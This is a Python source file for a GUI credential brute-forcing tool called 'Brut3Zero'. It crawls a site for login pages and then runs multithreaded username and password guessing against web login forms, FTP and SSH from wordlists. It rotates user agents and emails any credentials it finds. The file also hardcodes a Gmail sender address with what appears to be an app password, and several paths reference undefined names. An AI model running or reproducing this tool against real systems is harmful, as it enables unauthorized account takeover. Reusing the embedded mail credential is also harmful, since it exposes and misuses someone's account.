import os
from os import path
import sys
import time
import ftplib
import paramiko
import requests
import threading
import random
from bs4 import BeautifulSoup
import ttkbootstrap as ttk
import tkinter as tk
from tkinter import Label
from ttkbootstrap.constants import *
from ttkbootstrap.dialogs import Messagebox
from tkinter import filedialog, Toplevel
from tkinter.scrolledtext import ScrolledText
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from collections import deque
from PIL import Image, ImageTk
import webbrowser

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

USER_AGENTS = [
    "Mozilla/5.0", "Chrome/90.0", "Safari/537.36"
]
# global image_path
# image_path = getattr(sys,"MEIPASS",path.abspath(path.dirname(file_)))
# image_path = path.join(bundle,"assets",image_path)

# ------------------- SPLASH SCREEN -------------------
def show_splash(root, duration=3000):
    splash = Toplevel()
    splash.overrideredirect(True)
    splash.geometry("500x300+500+200")
    splash.configure(bg="#1e1e2f")
    # global image_path
    # image_path = getattr(sys,"MEIPASS",path.abspath(path.dirname(file_)))
    # image_path = path.join(bundle,"assets",image_path)
    try:
        img = Image.open("supraja.jpeg")  # Optional image
        img = img.resize((120, 120))
        photo = ImageTk.PhotoImage(img)
        img_label = ttk.Label(splash, image=photo, background="#1e1e2f")
        img_label.image = photo
        img_label.pack(pady=20)
        global image_path
        image_path = getattr(sys,"MEIPASS",path.abspath(path.dirname(file_)))
        image_path = path.join(bundle,"assets",image_path)
    except:
        pass

    ttk.Label(splash, text="ZenSec", font=("Helvetica", 26, "bold"), foreground="#00ffff", background="#1e1e2f").pack()
    ttk.Label(splash, text="Brute Force Tool Initializing...", font=("Helvetica", 12), foreground="white", background="#1e1e2f").pack(pady=10)
    bar = ttk.Progressbar(splash, length=300, mode='indeterminate', bootstyle="info")
    bar.pack(pady=20)
    bar.start(10)

    root.withdraw()

    def close_splash():
        splash.destroy()
        root.deiconify()

    splash.after(duration, close_splash)


# ----------- Helper functions for crawling ------------

def is_login_form(form):
    """
    Determine if the given BeautifulSoup <form> is a likely login form.
    - Looks for a password field and a username/email/user field.
    """
    inputs = form.find_all('input')
    has_password = any(inp.get('type') == 'password' for inp in inputs)
    user_id_fields = ['user', 'email', 'login', 'username', 'id']
    has_user = any(
        (inp.get('type') in ['text', 'email', None] and
         any(frag in (inp.get('name') or '').lower() for frag in user_id_fields))
        for inp in inputs
    )
    return has_password and has_user

def is_login_link(link):
    login_keywords = ['login', 'signin', 'account', 'auth', 'access', 'user', 'password', 'admin', 'member']
    href = link.lower()
    return any(kw in href for kw in login_keywords)

def normalize_url(url):
    # Removes fragments and query parameters for consistent URL visits
    parsed = urlparse(url)
    normalized = parsed._replace(fragment="", query="").geturl()
    return normalized.lower()


# ------------------- ENGINE -------------------
class BruteForceEngine:
    def __init__(self, log_callback, show_success_notification):
        self.log = log_callback
        self.delay = 0.1
        self.show_success_notification = show_success_notification
        self.max_threads = 5  # default

    # --------------- Crawl for login pages with depth 4 ---------------
    def crawl_for_login_pages(self, seed_url, max_depth=4, max_pages=100):
        self.log(f"[+] Crawling {seed_url} for login pages, max depth {max_depth}...")
        visited = set()
        queue = deque([(seed_url, 0)])  # each item: (URL, current_depth)
        base_domain = urlparse(seed_url).netloc
        found_logins = []

        while queue and len(visited) < max_pages:
            url, depth = queue.popleft()
            norm_url = normalize_url(url)
            if norm_url in visited or depth > max_depth:
                continue
            visited.add(norm_url)

            try:
                response = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=5)
                if response.status_code != 200 or 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                soup = BeautifulSoup(response.text, 'html.parser')

                # Check if URL looks like a login link
                if is_login_link(url):
                    found_logins.append(url)
                    self.log(f"[+] Found login-like URL: {url}")
                    continue  # We can skip form check if URL is very indicative

                # Check all forms on the page for login form
                login_form_found = False
                for form in soup.find_all('form'):
                    if is_login_form(form):
                        found_logins.append(url)
                        self.log(f"[+] Found login form at: {url}")
                        login_form_found = True
                        break
                if login_form_found:
                    continue

                # Enqueue links
                if depth < max_depth:
                    for a in soup.find_all('a', href=True):
                        link = urljoin(url, a['href'])
                        link_norm = normalize_url(link)
                        if urlparse(link).netloc == base_domain and link_norm not in visited:
                            if is_login_link(link):
                                queue.appendleft((link, depth + 1))  # Prioritize likely login candidate
                                self.log(f"[+] Prioritizing login candidate: {link}")
                            else:
                                queue.append((link, depth + 1))

            except Exception as e:
                self.log(f"[!] Exception while crawling {url}: {e}")
                continue

        if found_logins:
            self.log("[+] Potential login/admin pages discovered:")
            for login in found_logins:
                self.log(f"    [*] {login}")
        else:
            self.log("[!] No login pages found.")
        return found_logins

    def run_attack(self, target, username_path, wordlist_path, protocol, port=0):
        protocol = protocol.lower()
        self.log(f"[+] Starting brute force on {protocol.upper()}")
        if protocol == "http":
            self.http_attack(target, username_path, wordlist_path)
        elif protocol == "ftp":
            self.ftp_attack(target, username_path, wordlist_path, port)
        elif protocol == "ssh":
            self.ssh_attack(target, username_path, wordlist_path, port)
        else:
            self.log(f"[-] Unsupported protocol: {protocol}")

    def http_attack(self, target, username_path, wordlist_path):
        try:
            session = requests.Session()
            response = session.get(target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            if not form:
                self.log("[-] No form found on page.")
                return

            action = form.get('action')
            method = form.get('method', 'post').lower()
            login_url = target if not action else requests.compat.urljoin(target, action)

            input_fields = form.find_all('input')
            data = {}
            user_field = pass_field = None
            for inp in input_fields:
                name = inp.get('name')
                if not name:
                    continue
                lname = name.lower()
                if not user_field and lname in ['uname', 'username', 'user', 'login', 'email']:
                    user_field = name
                elif not pass_field and lname in ['pass', 'password', 'pwd']:
                    pass_field = name
                else:
                    data[name] = inp.get('value', '')

            if not user_field or not pass_field:
                self.log("[-] Username or password field not found.")
                return

            with open(wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f]
            with open(username_path, 'r') as f:
                usernames = [line.strip() for line in f]

            original_response = session.get(target)
            original_length = len(original_response.text)

            credentials = [(u, p) for u in usernames for p in passwords]

            def try_login(cred):
                username, password = cred
                try:
                    local_session = requests.Session()
                    headers = {"User-Agent": random.choice(USER_AGENTS)}
                    form_data = data.copy()
                    form_data[user_field] = username
                    form_data[pass_field] = password
                    self.log(f"[+] Attempting to login {username}:{password}")

                    if method == "post":
                        attempt = local_session.post(login_url, data=form_data, headers=headers, timeout=10)
                    else:
                        attempt = local_session.get(login_url, params=form_data, headers=headers, timeout=10)

                    if attempt.status_code in [301, 302]:
                        return username, password
                    elif "logout" in attempt.text.lower() or "dashboard" in attempt.text.lower():
                        return username, password
                    elif len(attempt.text) != original_length:
                        return username, password
                except Exception as e:
                    self.log(f"[!] Error with {username}:{password} - {e}")
                return None

            self.log(f"[+] Using {self.max_threads} threads for HTTP brute-force...")

            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = [executor.submit(try_login, cred) for cred in credentials]
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        u, p = result
                        self.log(f"[+] Login successful: {u}:{p}")
                        self.show_success_notification(f"{u}:{p}")
                        executor.shutdown(cancel_futures=True)
                        return

            self.log("[!] Brute-force completed. No valid credentials found.")

        except Exception as e:
            self.log(f"[!] Error during HTTP brute force: {e}")

    def ftp_attack(self, target, username_path, wordlist_path, port=21):
        try:
            with open(wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f]
            with open(username_path ,'r') as f:
                usernames = [line.strip() for line in f]
            for username in usernames:
                self.log(f"[+] Attempting to login with username: {username}")
                for password in passwords:
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(target, port, timeout=5)
                        ftp.login(username, password)
                        self.log(f"[+] Login successful, credentials are: {username}:{password}")
                        self.show_success_notification(f"{username}:{password}")
                        ftp.quit()
                        return
                    except ftplib.error_perm:
                        self.log(f"[-] Failed by using password: {password}")
                    except Exception as e:
                        self.log(f"[!] FTP error: {e}")
                    time.sleep(self.delay)
            self.log("[!] Brute-force completed. No valid password found.")
        except Exception as e:
            self.log(f"[!] FTP attack error: {e}")

    def ssh_attack(self, target, username_path, wordlist_path, port=22):
        try:
            with open(wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f]
            with open(username_path ,'r') as f:
                usernames = [line.strip() for line in f]
            for username in usernames:
                self.log(f"[+] Attempting to login with username: {username}")
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=5)
                        self.log(f"[+] Login successful, credentials are: {username}:{password}")
                        self.show_success_notification(f"{username}:{password}")
                        ssh.close()
                        return
                    except paramiko.AuthenticationException:
                        self.log(f"[-] Failed by using password: {password}")
                    except Exception as e:
                        self.log(f"[!] SSH error: {e}")
                    time.sleep(self.delay)
            self.log("[!] Brute-force completed. No valid password found.")
        except Exception as e:
            self.log(f"[!] SSH attack error: {e}")


# ------------------- GUI -------------------
class BruteForceGUI:
    def __init__(self, root):
        self.use_default_wordlist = None
        self.root = root
        self.root.title("Brut3Zero | ZenSec Brute Force Tool")
        self.root.geometry("900x600")
        self.root.resizable(True, True)

        self.threads_var = ttk.IntVar(value=5)
        self.use_default_username = ttk.BooleanVar()
        self.use_default_password = ttk.BooleanVar()
        self.target_var = ttk.StringVar()
        self.username_path = ttk.StringVar()
        self.wordlist_path = ttk.StringVar()
        self.protocol_var = ttk.StringVar(value="http")
        self.port_var = ttk.StringVar(value="80")
        self.email_var = ttk.StringVar()
        self.engine = BruteForceEngine(log_callback=self.log, show_success_notification=self.show_success_notification)

        self.build_gui()

        self.username_entry.bind("<KeyRelease>", lambda e: self.toggle_username_default())
        self.password_entry.bind("<KeyRelease>", lambda e: self.toggle_password_default())

    def build_gui(self):
        frm = ttk.Frame(self.root)
        frm.pack(fill="both", expand=True, padx=(0,10))

        ttk.Label(frm, text="Target URL / IP:").grid(row=0, column=0, sticky="e",padx=(0,30))
        ttk.Entry(frm, textvariable=self.target_var).grid(row=0, column=1, columnspan=2, sticky="ew")

        ttk.Label(frm, text="Username File (.txt):").grid(row=1, column=0, sticky="e",padx=(0,30))
        self.username_entry = ttk.Entry(frm, textvariable=self.username_path)
        self.username_entry.grid(row=1, column=1, sticky="ew")

        self.username_checkbox = ttk.Checkbutton(frm, text="Use Default Username File", variable=self.use_default_username, bootstyle="info", command=self.toggle_username_default)
        self.username_checkbox.grid(row=2, column=1, sticky="w")

        self.username_browse_btn = ttk.Button(frm, text="Browse", command=self.browse_username)
        self.username_browse_btn.grid(row=1, column=2,sticky="w")

        ttk.Label(frm, text="Password Wordlist:").grid(row=3, column=0, sticky="e",padx=(0,30))
        self.password_entry = ttk.Entry(frm, textvariable=self.wordlist_path)
        self.password_entry.grid(row=3, column=1, sticky="ew")

        self.password_checkbox = ttk.Checkbutton(frm, text="Use Default Password File", variable=self.use_default_password, bootstyle="info", command=self.toggle_password_default)
        self.password_checkbox.grid(row=4, column=1, sticky="w")

        self.password_browse_btn = ttk.Button(frm, text="Browse", command=self.browse_wordlist)
        self.password_browse_btn.grid(row=3, column=2 , sticky="w")

        ttk.Label(frm, text="Protocol:").grid(row=5, column=0, sticky="e",padx=(0,30))
        ttk.Combobox(frm, textvariable=self.protocol_var, values=["http", "ftp", "ssh"]).grid(row=5, column=1, sticky="w")

        ttk.Label(frm, text="Port:").grid(row=6, column=0, sticky="e",padx=(0,30))
        ttk.Entry(frm, textvariable=self.port_var, width=10).grid(row=6, column=1, sticky="w")

        # Crawl for login pages checkbox
        self.crawl_login_var = ttk.BooleanVar(value=False)
        ttk.Checkbutton(frm, text="Crawl Site For Login Pages Before Attack", variable=self.crawl_login_var, bootstyle="warning").grid(row=6, column=2, sticky="w", padx=(30,0))

        # New Email label + entry - added here
        ttk.Label(frm, text="Notification Email:").grid(row=7, column=0, sticky="e", padx=(0,30))
        ttk.Entry(frm, textvariable=self.email_var).grid(row=7, column=1, sticky="ew")

        ttk.Label(frm, text="Bruteforce Attack Speed (per Second):").grid(row=8, column=0, sticky="e", padx=(0,30))
        ttk.Spinbox(frm, from_=1, to=50, textvariable=self.threads_var, width=10).grid(row=8, column=1, sticky="w")

        # Buttons aligned on one row with spacing
        buttons_frame = ttk.Frame(frm)
        buttons_frame.grid(row=9, column=0, columnspan=3, pady=10, sticky="ew")
        buttons_frame.columnconfigure((0,1,2), weight=1)

        ttk.Button(buttons_frame, text="📘 Project Info", command=self.open_project_info, bootstyle="info").grid(row=0, column=0, sticky="w", padx=5)
        ttk.Button(buttons_frame, text="Start Attack", command=self.start_attack, bootstyle="danger").grid(row=0, column=1, sticky="ew", padx=5)
        ttk.Button(buttons_frame, text="Export Logs", command=self.export_logs, bootstyle="secondary").grid(row=0, column=2, sticky="e", padx=5)

        ttk.Label(frm, text="Output Log:").grid(row=10, column=0, columnspan=3, sticky="w")

        self.output_text = ScrolledText(frm, font=("Consolas", 10))
        self.output_text.grid(row=11, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        frm.columnconfigure(0, weight=1)
        frm.columnconfigure(1, weight=3)
        frm.columnconfigure(2, weight=0)
        frm.rowconfigure(11, weight=1)

    def browse_wordlist(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.wordlist_path.set(file_path)
        self.toggle_password_default()

    def browse_username(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            self.username_path.set(file_path)
        self.toggle_username_default()

    def toggle_username_default(self):
        if self.use_default_username.get():
            self.username_entry.configure(style="Grayed.TEntry")
            self.username_browse_btn.configure(style="Grayed.TButton")
            self.username_checkbox.configure(style="Normal.TCheckbutton")
        else:
            self.username_entry.configure(style="TEntry")
            self.username_browse_btn.configure(style="TButton")
        bundle = ""
        if (self.username_path.get().strip()):
            self.username_checkbox.configure(style="Strikethrough.TCheckbutton")
            if self.use_default_username.get() :
                self.username_checkbox.configure(style="Normal.TCheckbutton")
                bundle = getattr(sys,"_MEIPASS",path.abspath(path.dirname(__file__)))
                self.bundle_path = path.join(bundle,"assests","usernames.txt")
                self.username_path.set(self.bundle_path)
        else:
            self.username_checkbox.configure(style="Normal.TCheckbutton")

    def toggle_password_default(self):
        if self.use_default_password.get():
            self.password_entry.configure(style="Grayed.TEntry")
            self.password_browse_btn.configure(style="Grayed.TButton")
        else:
            self.password_entry.configure(style="TEntry")
            self.password_browse_btn.configure(style="TButton")

        if self.wordlist_path.get().strip():
            self.password_checkbox.configure(style="Strikethrough.TCheckbutton")
            if self.use_default_password.get():
                self.password_checkbox.configure(style="Normal.TCheckbutton")
                bundle = getattr(sys,"_MEIPASS",path.abspath(path.dirname(__file__)))
                self.log(bundle)
                self.log("toggled")
                self.bundle_path = path.join(bundle,"assests","passwords.txt")
                self.wordlist_path.set(self.bundle_path)
        else:
            self.password_checkbox.configure(style="Normal.TCheckbutton")

    def send_success_email(self, to_email, creds):
        try:
            from_email = "advancebrutefoce@gmail.com"                 # TODO: Replace with real sender email
            from_password = "rmjs hnny ysrh ninj"                  # TODO: Replace with real app password or use env vars

            subject = "ZenSec Brute Force - Successful Login Found"
            body = f"Hello,\n\nThe brute force attack found valid credentials:\n\n{creds}\n\nRegards,\nZenSec Tool"

            msg = MIMEMultipart()
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(from_email, from_password)
            server.send_message(msg)
            server.quit()

            self.log(f"[+] Success email sent to {to_email}")
        except Exception as e:
            self.log(f"[!] Failed to send email: {e}")

    def show_success_notification(self, creds):
        # Send success email if email provided
        email = self.email_var.get().strip()
        if email:
            threading.Thread(target=self.send_success_email, args=(email, creds), daemon=True).start()

        dialog = Toplevel(self.root)
        dialog.title("Success")
        dialog.geometry("450x220")
        dialog.configure(bg="black")
        dialog.overrideredirect(True)
        dialog.attributes("-topmost", True)

        x = self.root.winfo_x() + (self.root.winfo_width() // 2) - 225
        y = self.root.winfo_y() + (self.root.winfo_height() // 2) - 110
        dialog.geometry(f"+{x}+{y}")

        title_label = Label(dialog, text="", font=("Segoe UI", 16, "bold"), fg="lime", bg="black")
        title_label.pack(pady=(20, 10))

        creds_label = Label(dialog, text="", font=("Courier", 12), fg="cyan", bg="black", justify="center")
        creds_label.pack()

        def blink_title():
            try:
                while True:
                    current = title_label.cget("text")
                    title_label.config(text="🔥 LOGIN SUCCESSFUL 🔥" if current == "" else "")
                    time.sleep(0.5)
            except tk.TclError:
                pass

        def type_writer(label, text, delay=0.04):
            for i in range(len(text) + 1):
                label.config(text=text[:i])
                time.sleep(delay)

        def animate():
            threading.Thread(target=blink_title, daemon=True).start()
            time.sleep(0.8)
            type_writer(creds_label, f"Credentials:\n{creds}", 0.04)
            time.sleep(3)
            fade_out()

        def fade_out():
            try:
                for alpha in range(100, 0, -10):
                    dialog.attributes("-alpha", alpha / 100)
                    time.sleep(0.03)
                dialog.destroy()
            except tk.TclError:
                pass

        threading.Thread(target=animate, daemon=True).start()

    def log(self, message):
        self.output_text.insert("end", message + "\n")
        self.output_text.see("end")

    def export_logs(self):
        log_content = self.output_text.get("1.0", "end").strip()
        if not log_content:
            Messagebox.show_info("Nothing to export.")
            return
        path_save = filedialog.asksaveasfilename(defaultextension=".pdf",
                                                filetypes=[("Pdf files", "*.pdf")],
                                                title="Save Logs As")
        if path_save:
            with open(path_save, "w") as f:
                f.write(log_content)
            Messagebox.show_info(f"Logs exported to:\n{path_save}")

    def open_project_info(self):
        # html_path = os.path.abspath("loki.html")
        html_path = getattr(sys,"MEIPASS",path.abspath(path.dirname(file_)))
        html_path = path.join(bundle,"assets","loki.html")
        if os.path.exists(html_path):
            webbrowser.open(f"file://{html_path}")
        else:
            self.log("[!] project_info.html not found.")

    def start_attack(self):
        target = self.target_var.get()
        username = self.username_path.get()
        wordlist = self.wordlist_path.get()
        protocol = self.protocol_var.get()
        self.engine.max_threads = self.threads_var.get()

        if self.use_default_username.get():
            bundle = getattr(sys,"_MEIPASS",path.abspath(path.dirname(__file__)))
            self.bundle_path = path.join(bundle,"assests","usernames.txt")
            self.username_path.set(self.bundle_path)
            self.log("[!] Using default username wordlist....")
            username = self.username_path.get()

        if self.use_default_password.get():
            bundle = getattr(sys,"_MEIPASS",path.abspath(path.dirname(__file__)))
            self.bundle_path = path.join(bundle,"assests","passwords.txt")
            self.wordlist_path.set(self.bundle_path)
            self.log("[!] Using default password wordlist....")
            wordlist = self.wordlist_path.get()

        try:
            port = int(self.port_var.get())
        except ValueError:
            Messagebox.show_error("Invalid port number.")
            return
        if not all([target]):
            Messagebox.show_error("Please fill target fields.")
            return
        if not all([username, wordlist]) and not (self.use_default_username.get() and self.use_default_password.get()):
            Messagebox.show_error("Please fill fields or select default files.")
            return

        # -------- Crawl before attack if checked ---------
        if hasattr(self, "crawl_login_var") and self.crawl_login_var.get():
            self.output_text.delete("1.0", "end")  # Clear log
            found_logins = self.engine.crawl_for_login_pages(target, max_depth=4)
            if found_logins:
                new_target = found_logins[0]
                self.log(f"[!] Auto starting brute force on: {new_target}")
                thread = threading.Thread(
                    target=self.engine.run_attack,
                    args=(new_target, username, wordlist, protocol, port),
                    daemon=True
                )
                thread.start()
                Messagebox.show_info(f"Crawled and found login page:\n{new_target}\nAttack started automatically.")
            else:
                Messagebox.show_info("No login pages detected by crawler. Attack aborted.")
            return  # Important to not run attack twice

        else:
            self.output_text.delete("1.0", "end")
            thread = threading.Thread(
                target=self.engine.run_attack,
                args=(target, username, wordlist, protocol, port),
                daemon=True
            )
            thread.start()


# ------------------- RUN -------------------
if __name__ == "__main__":
    root = ttk.Window(themename="cyborg")

    style = ttk.Style()
    style.configure("Grayed.TEntry", foreground="gray")
    style.configure("Grayed.TButton", foreground="gray")
    style.configure("Strikethrough.TCheckbutton", font=("Segoe UI", 9, "overstrike"))
    style.configure("Normal.TCheckbutton", font=("Segoe UI", 9))
    # global image_path
    # image_path = getattr(sys,"MEIPASS",path.abspath(path.dirname(file_)))
    # image_path = path.join(bundle,"assets",image_path)
    show_splash(root)
    app = BruteForceGUI(root)
    root.mainloop()
